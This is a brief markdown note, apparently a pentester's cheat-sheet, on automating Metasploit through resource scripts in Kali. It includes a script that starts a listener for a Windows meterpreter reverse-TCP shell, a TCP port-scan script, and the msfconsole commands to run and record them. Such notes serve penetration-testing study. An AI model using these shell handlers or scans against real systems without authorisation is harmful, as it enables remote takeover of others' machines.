# Automating With Resource Scripts

### Scripts prebuilt in kali

```bash
ls -al /usr/share/metasploit-framework/scripts/resource/
```

### Example:

#### Windows 64bit meterpreter shell

```bash
nano handler.rc
#script
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.1.100.11
set LPORT 9999
run
```

#### Portscan

```bash
nano portscan.sc
#script
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.1.100.11
run
```

### Usage

```bash
#from shell
msfconsole -r handler.rc
#from inside msfconsole
resource /home/kali/handler.rc
#to record all my previous command i input from msfconsole
makerc /home/kali/saved.rc
```
